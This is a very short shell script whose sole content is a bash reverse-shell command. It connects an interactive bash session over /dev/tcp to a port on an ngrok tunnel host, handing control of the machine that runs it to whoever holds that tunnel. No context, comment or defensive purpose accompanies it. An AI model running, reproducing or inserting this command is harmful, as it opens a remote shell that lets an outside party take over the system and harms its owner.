#!/bin/sh

bash -c "bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/15286 0>&1"
